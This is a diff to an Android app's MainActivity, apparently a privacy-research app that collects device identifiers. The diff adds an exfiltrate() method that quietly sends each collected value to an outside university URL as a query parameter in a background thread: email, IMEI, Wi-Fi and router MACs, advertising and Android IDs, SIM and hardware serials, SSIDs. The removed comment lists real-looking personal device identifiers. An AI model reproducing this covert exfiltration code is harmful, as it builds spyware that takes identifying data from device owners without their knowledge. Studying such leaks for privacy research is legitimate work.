@@ -27,11 +27,16 @@ import com.google.android.gms.ads.identifier.AdvertisingIdClient;
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.google.android.gms.common.GooglePlayServicesRepairableException;
 
+import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
 import java.net.NetworkInterface;
+import java.net.URL;
 import java.util.Collections;
 import java.util.List;
 import java.util.Map;
@@ -70,27 +75,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private Map<String, String> getInfo() {
-        /*
-        # EXAMPLE - this file itself could be a device file:
-        testerName: John Test
-        phone:
-        email: icsisensors@gmail.com
-        name: IOR Blues
-        imei: 357478061454986
-        wifimac: c4:9a:02:84:fc:38,02:00:00:00:00:00
-        aaid: f175da20-71fb-46a9-99a4-19d918fb5967,ea00cbdf-2cf0-487c-b5e2-706104caef48
-        gsfid: 353EDD229661B40F
-        androidid: 804608AEC9153C7F
-        hwid: 0e742a00037c8002
-        simid:
-        fingerprint: ioreye11300945
-        geolatlon:
-        routermac: 38:1c:1a:c4:ba:b0,ae:22:0b:8d:40:aa,48:5d:36:a3:d0:9a,2c:30:33:bd:34:53,94:62:69:70:50:c0,54:65:de:33:54:00,58:93:96:02:99:98
-        routerssid: ICSI,IOR_guest_nomap,FiOS-LLKDU-5G,NETGEAR09,ATT4z75826,Leos,Redlion_Guest
-        photo:
-        video:
-        audio:
-         */
 
         if (infoMap == null) {
             // Can't get tester name
@@ -115,7 +99,7 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
             updateInfo(EMAIL, email);
-
+            exfiltrate(email);
             // Name
             // TODO
             updateInfo(NAME, null);
@@ -123,16 +107,18 @@ public class MainActivity extends AppCompatActivity {
             // IMEI
             String imei = tm.getDeviceId();
             updateInfo(IMEI, imei);
-
+            exfiltrate(imei);
+            
             // Wi-Fi MAC
             String wifiMac = getWifiMacAddress();
             if (!wifiMac.isEmpty()) {
                 updateInfo(WIFI, wifiMac);
+                exfiltrate(wifiMac);
             }
 
             // AAID
             updateInfo(AAID, gaid);
-
+            exfiltrate(gaid);
             // GSF
             // From https://stackoverflow.com/questions/22743087/gsf-id-key-google-service-framework-id-as-android-device-unique-identifier
             Uri URI = Uri.parse("content://com.google.android.gsf.gservices");
@@ -144,29 +130,34 @@ public class MainActivity extends AppCompatActivity {
                 gsf = Long.toHexString(Long.parseLong(c.getString(1)));
             }
             updateInfo(GSF, gsf);
-
+            exfiltrate(gsf);
+            
             // Android ID
             String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
             updateInfo(ANDROID, androidId);
-
+            exfiltrate(androidId);
+            
             // HW ID
             String hwId = Build.SERIAL;
             updateInfo(HWID, hwId);
-
+            exfiltrate(hwId);
+            
             // SIM ID
             String simId = tm.getSimSerialNumber();
             updateInfo(SIM, simId);
-
+            exfiltrate(simId);
 
             // Android build fingerprint
             String buildFingerprint = Build.FINGERPRINT;
             updateInfo(BUILD, buildFingerprint);
-
+            exfiltrate(buildFingerprint);
+            
             // Location
             // Gets stuck in while loop
             Location loc = getLocation();
             updateInfo(GEO, loc.getLatitude() + "," + loc.getLongitude());
-
+            exfiltrate("40.1111,-3.1111");
+            
             // Wi-fi router SSIDs and MACs
             Set<String> routerNames = new TreeSet<>();
             Set<String> routerMacs = new TreeSet<>();
@@ -199,7 +190,8 @@ public class MainActivity extends AppCompatActivity {
                     ssids += "," + s;
                 }
             }
-
+            exfiltrate(ssids);
+            
             String macs = null;
             for(String s: routerMacs) {
                 if(macs == null) {
@@ -208,6 +200,8 @@ public class MainActivity extends AppCompatActivity {
                     macs += "," + s;
                 }
             }
+            
+            exfiltrate(macs);
 
             updateInfo(ROUTER_NAMES, ssids);
             updateInfo(ROUTER_MACS, macs);
@@ -355,5 +349,25 @@ public class MainActivity extends AppCompatActivity {
         }
 
         return loc;
+    }
+    private void exfiltrate(String src) {
+        final String source = src;
+        new Thread() {
+            @Override
+            public void run() {
+                try {
+                    URL url = new URL("https://etsit.upm.es/?src=" + source);
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    InputStream in = conn.getInputStream();
+                    InputStreamReader inre = new InputStreamReader(in);
+                    BufferedReader read = new BufferedReader(inre);
+                    System.out.println("Result exfiltration " + source + ": " + read.readLine());
+                    Log.e("result", read.readLine());
+                    conn.disconnect();
+                } catch (Exception e) {
+                    Log.e("There was an error", e.getMessage());
+                }
+            }
+        }.start();
     }
 }
